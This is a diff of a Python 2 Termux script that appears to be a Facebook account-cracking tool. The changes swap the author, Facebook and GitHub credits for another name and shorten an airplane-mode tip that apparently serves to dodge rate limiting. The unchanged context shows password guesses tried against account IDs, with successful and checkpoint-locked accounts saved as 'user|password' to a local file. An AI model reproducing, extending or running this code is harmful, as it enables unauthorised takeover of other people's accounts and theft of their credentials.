@@ -80,9 +80,9 @@ def menu():
     os.system('clear')
     print logo
     print '                                              \033[107;1m version :0.1\033[00;1m'
-    print '\x1b[1;93mAUTHOR   : \x1b[1;92mTwoaha Ibn Jalal'                                           
-    print '\x1b[1;93mFACEBOOK : \x1b[1;92mIts Twoaha'
-    print '\x1b[1;93mGITHUB   : \x1b[1;92mTwoaha'
+    print '\x1b[1;93mAUTHOR   : \x1b[1;92mTahidul Khan'                                           
+    print '\x1b[1;93mFACEBOOK : \x1b[1;92mTERMUX LOVER'
+    print '\x1b[1;93mGITHUB   : \x1b[1;92mTAHIDUL-123'
     print ''
     print '\x1b[1;97m============================================'
     print '\x1b[1;91m[1]  \x1b[1;93mGP'
@@ -211,7 +211,7 @@ def action():
     time.sleep(0.5)
     psb('+  [!] TO STOP PROCESS PRESS CTRL THEN PRESS Z ')
     time.sleep(0.5)
-    psb('+  [!] IF NO RESULT USE AIRPLANE MODE 15 SECONDS')
+    psb('+  [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS')
     time.sleep(0.5)
     psb('++++++++++++++++++++++++++++++++++++++++++++++++')
     time.sleep(0.5)
@@ -239,7 +239,7 @@ def action():
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;93m[Twoaha-CP]\x1b[1;93m ' + k + c + user + ' | ' + pass1  +  '\x1b[1;93m  [Open After 07 Days]\x1b[0m \n'
+                print '\x1b[1;93m[KHAN-CP]\x1b[1;93m ' + k + c + user + ' | ' + pass1  +  '\x1b[1;93m  [Open After 07 Days]\x1b[0m \n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
